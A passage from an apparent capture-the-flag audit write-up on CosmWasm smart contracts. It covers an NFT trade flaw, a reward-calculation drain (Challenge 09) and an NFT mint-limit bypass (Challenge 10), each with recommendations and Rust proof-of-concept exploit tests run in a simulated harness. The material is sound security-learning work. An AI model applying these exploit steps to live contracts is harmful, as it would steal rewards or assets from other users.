            spender: contract_addr.to_string(), 
            token_id: NFT2.to_string()
        };
        app.execute_contract(
            Addr::unchecked(USER2),
            token_addr.clone(),
            &revoke_msg,
            &[],
        )
        .unwrap();

        // USER1 accepts trade, thinking they will get NFT2
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr,
            &ExecuteMsg::AcceptTrade {
                id: NFT1.to_string(),
                trader: USER2.to_string(),
            },
            &[],
        )
        .unwrap();

        // USER2 got NFT1, that's good
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr.clone(),
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT1.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER2.to_string());

        // But USER2 also has NFT2, not good
        let owner_of: OwnerOfResponse = app
            .wrap()
            .query_wasm_smart(
                token_addr,
                &Cw721QueryMsg::OwnerOf {
                    token_id: NFT2.to_string(),
                    include_expired: None,
                },
            )
            .unwrap();
        assert_eq!(owner_of.owner, USER2.to_string());
    }
```

---

## Challenge 09: *Brisingamen*

### Description

#### Severity: $\textcolor{orange}{\textsf{Major}}$ 

The bug in this contract is a combination of 
- How rewards are calculated
- Insufficient limitations around user actions

Since rewards are not immediately distributed to users when `OWNER` calls `IncreaseReward` (which I would not recommend), an exploiter can do the following:
- Claim previous rewards + Withdraw funds + Wait until `OWNER` calls `IncreaseReward`
- When rewards are added, the exploiter immediately deposits and claims rewards
- Because the reward calculation does not take into account how long the exploiter has had tokens deposited, they are sent an unfair amount of rewards
- This not only takes rewards from other users, but will also leave the last person/people to claim rewards unable to claim anything, because the contract will not have enough `REWARD_TOKEN` to send them

### Recommendation

My recommendation would be to include the amount of time a user has had tokens deposited when calculating their rewards. This would prevent the bug described above where an exploiter can swoop in and steal rewards from other users. 

You may also want to allow a user to claim a specific amount of their rewards (as opposed to only being able to claim all rewards at once). This would be useful incase of inconsistencies between the amount of `REWARD_TOKEN` the contract has VS the amount of `rewards` the user is eligible for, due to the nature of math & rounding involved.

You might also consider adding an "unstaking" period to the contract, applied when a user calls `Withdraw`, especially if the `IncreaseReward` method is to be executed on a set schedule (once every Monday etc).

### Proof of concept

```rust
    #[test]
    fn thx_for_nothing() {
        let (mut app, contract_addr) = proper_instantiate();

        // new user2 join
        app = mint_tokens(app, USER2.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // owner increases reward
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();
        assert_eq!(user_info.pending_rewards, Uint128::new(15_000));

        // query user2 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();
        assert_eq!(user_info.pending_rewards, Uint128::new(5_000));

        // user1 claim rewards
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // query user1 info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();
        assert_eq!(user_info.pending_rewards, Uint128::zero());

        // query user1 reward balance
        let balance = app
            .wrap()
            .query_balance(USER.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;
        assert_eq!(balance, Uint128::new(15_000));

        // user1 withdraw all funds
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw {
                amount: Uint128::new(10_000),
            },
            &[],
        )
        .unwrap();

        // query user1 balance
        let balance = app
            .wrap()
            .query_balance(USER.to_string(), DENOM)
            .unwrap()
            .amount;
        assert_eq!(balance, Uint128::new(10_000));

        // query user info
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER.to_string(),
                },
            )
            .unwrap();
        assert_eq!(user_info.staked_amount, Uint128::zero());

        // query state
        let state: State = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::State {})
            .unwrap();
        assert_eq!(state.total_staked, Uint128::new(10_000));

        // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Exploit starts here
        // OWNER increases reward
        app = mint_reward_tokens(app, OWNER.to_owned(), Uint128::new(10_000));
        app.execute_contract(
            Addr::unchecked(OWNER),
            contract_addr.clone(),
            &ExecuteMsg::IncreaseReward {},
            &[coin(10_000, REWARD_DENOM)],
        )
        .unwrap();

        // USER1 was waiting for this and immediately stakes again
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::Deposit {},
            &[coin(10_000, DENOM)],
        )
        .unwrap();

        // USER1 then claims rewards before USER2 can claim rewards
        app.execute_contract(
            Addr::unchecked(USER),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap();

        // Verify that USER1 got all 10_000 reward tokens deposited by OWNER, leaving nothing for USER2
        let balance = app
            .wrap()
            .query_balance(USER.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;
        // Before the exploit they had 15_000, they now have 25_000
        assert_eq!(balance, Uint128::new(25_000));

        // USER2 is -supposed- to have 15_000 rewards available...
        let user_info: UserRewardInfo = app
            .wrap()
            .query_wasm_smart(
                contract_addr.clone(),
                &QueryMsg::User {
                    user: USER2.to_string(),
                },
            )
            .unwrap();
        assert_eq!(user_info.pending_rewards, Uint128::new(15_000));

        // ...but the contract only has 5_000 tokens
        let contract_balance = app
            .wrap()
            .query_balance(contract_addr.clone().to_string(), REWARD_DENOM)
            .unwrap()
            .amount;
        assert_eq!(contract_balance, Uint128::new(5_000));

        // USER2 withdraws their staked tokens
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::Withdraw {
                amount: user_info.staked_amount,
            },
            &[],
        )
        .unwrap();

        // When USER2 tries to claim their rewards (should be 15_000) 
        // the contract only has 5_000 tokens to send them, so this fails
        app.execute_contract(
            Addr::unchecked(USER2),
            contract_addr.clone(),
            &ExecuteMsg::ClaimRewards {},
            &[],
        )
        .unwrap_err();

        // Because USER2 claiming rewards failed, the contract still has 5_000 reward tokens
        let balance = app
            .wrap()
            .query_balance(contract_addr.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;
        assert_eq!(balance, Uint128::new(5_000));

        // Verify that USER2 did not receive any REWARD_DENOM
        let balance = app
            .wrap()
            .query_balance(USER2.to_string(), REWARD_DENOM)
            .unwrap()
            .amount;
        assert_eq!(balance, Uint128::zero());
    }

```

---

## Challenge 10: *Mistilteinn*

### Description

#### Severity: $\textcolor{orange}{\textsf{Major}}$ 

The bug in this contract is that it relys on querying the NFT contract to check how many NFTs a `USER` owns. This can be easily bypassed by creating another wallet, or using a "dummy" contract as shown in the proof of concept exploit.
- `USER` mints 3 NFTs
- `USER` sends an NFT to another wallet or a smart contract they control
- `USER` can now mint a 4th NFT and bypass the limit

### Recommendation

A simple fix would be keeping track of how many NFTs a `USER` has minted in this contract, rather than relying on a query of the external NFT contract

```rust
// Example of a simple Map to keep track of how many NFTs a user has minted
const MINT_COUNT: Map<&Addr, u32> = Map::new("mint_count");

// Checking how many NFTs a user has minted
let user_mint_count = MINT_COUNT.load(deps.storage, &USER).unwrap_or_default();
if user_mint_count >= config.mint_per_user {
    return Err(ContractError::MaxLimitExceeded {});
}
```

### Proof of concept

```rust
    /// Same logic as `proper_instantiate` except also returns a "dummy contract"
    /// that will hold the exploiters NFTs for them
    pub fn proper_instantiate_w_dummy() -> (App, Addr, Addr) {
        let mut app = App::default();
        let challenge_id = app.store_code(challenge_code());
        let cw_721_id = app.store_code(cw721_code());

        // Init challenge
        let challenge_inst = InstantiateMsg {
            cw721_code_id: cw_721_id,
            mint_per_user: 3,
            whitelisted_users: vec![USER1.to_owned(), USER2.to_owned(), USER3.to_owned()],
        };

        let contract_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(ADMIN),
                &challenge_inst,
                &[],
                "test",
                None,
            )
            .unwrap();

        // For this test it doesn't matter what the dummy contract does,
        // in a real world exploit it would simply hold the user's NFTs for them
        let dummy_addr = app
            .instantiate_contract(
                challenge_id,
                Addr::unchecked(USER1),
                &challenge_inst,
                &[],
                "dummy",
                None
            ).unwrap();

        (app, contract_addr, dummy_addr)
    }


    #[test]
    fn clever_test_name() {
        let (mut app, contract_addr, dummy_addr) = proper_instantiate_w_dummy();

        // query config
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Config {})
            .unwrap();

        // query whitelisted users
        let whitelist: Whitelist = app
            .wrap()
            .query_wasm_smart(contract_addr.clone(), &QueryMsg::Whitelist {})
            .unwrap();

        assert!(whitelist.users.contains(&USER1.to_owned()));
        assert!(whitelist.users.contains(&USER2.to_owned()));
        assert!(whitelist.users.contains(&USER3.to_owned()));

        // mint to whitelisted user until max limit
        assert_eq!(config.mint_per_user, 3);

        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // exceed max limit fails
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap_err();

        // Check what NFTs USER1 owns
        let user1_nfts: cw721::TokensResponse = app
            .wrap()
            .query_wasm_smart(config.nft_contract.clone(), &cw721_base::QueryMsg::Tokens::<Empty> { 
                owner: USER1.to_string(), 
                start_after: None, 
                limit: None 
            })
            .unwrap();
        assert!(user1_nfts.tokens.len() == 3);

        // USER1 sends an NFT to a dummy contract
        let nft_to_send = user1_nfts.tokens[0].clone();
        app.execute_contract(
            Addr::unchecked(USER1),
            config.nft_contract.clone(),
            // would likely use SendNft in real world scenario
            &cw721_base::ExecuteMsg::TransferNft::<Empty, Empty> { 
                recipient: dummy_addr.clone().to_string(), 
                token_id: nft_to_send.clone()
            },
            &[]
        ).unwrap();

        // Verify that dummy contract has NFT
        let dummy_nfts: cw721::TokensResponse = app
            .wrap()
            .query_wasm_smart(config.nft_contract.clone(), &cw721_base::QueryMsg::Tokens::<Empty> { 
                owner: dummy_addr.clone().to_string(), 
                start_after: None, 
                limit: None 
            })
            .unwrap();
        assert!(dummy_nfts.tokens.len() == 1);
        assert!(dummy_nfts.tokens.contains(&nft_to_send));

        // Verify that USER1 can mint another NFT, bypassing the limit
        app.execute_contract(
            Addr::unchecked(USER1),
            contract_addr.clone(),
            &ExecuteMsg::Mint {},
            &[],
        )
        .unwrap();

        // Ensure there is now 4 NFTs
        let config: Config = app
            .wrap()
            .query_wasm_smart(contract_addr, &QueryMsg::Config {})
            .unwrap();
        assert_eq!(config.total_tokens, 4);
    }

```
